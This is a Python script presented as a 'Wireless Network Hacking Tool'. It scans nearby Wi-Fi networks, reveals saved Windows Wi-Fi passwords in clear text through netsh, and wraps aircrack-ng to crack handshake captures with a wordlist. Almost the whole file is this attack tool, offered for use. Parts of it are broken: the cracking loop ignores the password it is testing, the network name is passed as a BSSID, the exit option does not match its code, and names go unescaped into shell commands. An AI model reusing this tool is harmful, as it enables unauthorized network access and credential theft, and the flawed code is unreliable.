import subprocess
import re
import os


# Scan networks using netsh on Windows
def scan_wifi():
    print("[*] Scanning nearby networks...")
    try:
        # Using netsh on Windows to scan networks
        networks = subprocess.check_output(["netsh", "wlan", "show", "network"], stderr=subprocess.STDOUT)

        # Change encoding to latin1 or windows-1252 to avoid encoding issues
        networks = networks.decode("latin1", errors='ignore')

        # Extract network names, encryption types, signal strength using regular expressions
        essids = re.findall(r'SSID \d+ : (.*)', networks)
        encryption = re.findall(r'Encryption key\s+:\s+(.*)', networks)
        signal_strength = re.findall(r'Signal\s+:\s+(\d+)', networks)
        bssids = re.findall(r'BSSID \d+ : (.*)', networks)

        if not essids:
            print("[!] No nearby networks found")
            return []

        network_info = []
        for index, essid in enumerate(essids):
            encryption_type = encryption[index] if index < len(encryption) else "Open"
            signal = int(signal_strength[index]) if index < len(signal_strength) else 0
            bssid = bssids[index] if index < len(bssids) else "Not available"
            network_info.append((essid, encryption_type, signal, bssid))

        # Sort networks by signal strength
        network_info.sort(key=lambda x: x[2], reverse=True)

        print("[*] Nearby networks:")
        for idx, info in enumerate(network_info, 1):
            print(f"{idx}. Network Name: {info[0]}, Encryption Type: {info[1]}, Signal Strength: {info[2]}%, BSSID: {info[3]}")

        return network_info
    except Exception as e:
        print(f"[!] An error occurred: {e}")
        return []


# Get the stored password for a specific network
def get_wifi_password(profile_name):
    print(f"\33[92;1m[*] Retrieving password for network \33[39;0m{profile_name}...")
    try:
        # Use the command to get the stored password
        command = f"netsh wlan show profile name=\"{profile_name}\" key=clear"
        result = subprocess.check_output(command, stderr=subprocess.STDOUT)
        result = result.decode("latin1", errors='ignore')

        # Search for the password
        password_search = re.search(r"Key Content\s+:\s+(.*)", result)
        if password_search:
            print(f"\33[93;1m[+] Password for : \33[39;0m[ {profile_name} ] ⇄  [ {password_search.group(1)} ]")
        else:
            print(f"\33[91;1m[!] No password found for network \33[39;0m{profile_name}")
    except subprocess.CalledProcessError:
        print(f"\33[36;1m[!] Could not find password for network {profile_name}\33[39;0m")
    except Exception as e:
        print(f"[!] An error occurred: {e}")


# Load password list from an external file
def load_password_list(file_path):
    passwords = []
    try:
        with open(file_path, 'r') as file:
            passwords = file.readlines()
        passwords = [password.strip() for password in passwords]
        print(f"[*] Loaded {len(passwords)} passwords from {file_path}")
    except Exception as e:
        print(f"[!] An error occurred while loading the file: {e}")
    return passwords


# Attempt to guess the password for a network using the stored password list
def test_passwords(profile_name, password_list):
    print(f"[*] Starting password test for network {profile_name}...")

    for password in password_list:
        print(f"[*] Testing password: {password}")

        # Here, tools like aircrack-ng or hashcat can be integrated to test passwords
        # For example, using aircrack-ng on a capture file that contains the handshake
        # We'll simulate the test process using subprocess

        # Example of testing a password using aircrack-ng (you must have a capture handshake file)
        capture_file = "handshake.cap"  # Capture file that contains the handshake
        wordlist_file = "passwords.txt"  # Password list file
        output_file = "cracked.txt"  # Output file for results

        try:
            # Use aircrack-ng to test the password on the network using the password list
            command = f"aircrack-ng {capture_file} -w {wordlist_file} -b {profile_name} > {output_file}"
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            if "KEY FOUND" in result.stdout.decode():
                print(f"[+] Found the correct password: {password}")
                break
        except Exception as e:
            print(f"[!] An error occurred while testing the password: {e}")


# Main function to display options to the user
def main():
    print("*"*45)
    print("\33[91;1mWireless Network Hacking Tool\33[39;0m")
    print("*"*45)

    while True:
        print("\33[96;1m\nAvailable Options :\33[39;0m")
        print("\33[93;2m1. Scan nearby networks\33[39;0m")
        print("\33[94;2m2. Retrieve WiFi password\33[39;0m")
        print("\33[95;2m3. Load password list from a file\33[39;0m")
        print("\33[92;2m4. Test passwords on a specific network\33[39;0m")
        print("\33[31;1m5. Exit\33[39;0m")

        choice = input("\33[8;1m\nEnter the desired option \33[39;0m: ")

        if choice == "1":
            networks = scan_wifi()
            if networks:
                print("[*] You can now select a network to test passwords on.")

        elif choice == "2":
            network_name = input("\n[*] Enter the network name to retrieve the password: ")
            get_wifi_password(network_name)

        elif choice == "3":
            file_path = input("\n[*] Enter the file path containing the password list: ")
            password_list = load_password_list(file_path)

        elif choice == "4":
            network_name = input("\n[*] Enter the network name to test passwords on: ")
            if 'password_list' in locals():
                test_passwords(network_name, password_list)
            else:
                print("[!] You must first load the password list.")

        elif choice == "0" or choice == '00':
            print("\n[*] Exiting the program.")
            print("\33[94;1m\nDEVELOPER | MOHAMMED ALAA MOHAMMED\n\33[39;0m")
            break

        else:
            print("\33[91;1m[!] Invalid option. Try again.\33[39;0m")


if __name__ == "__main__":
    main()
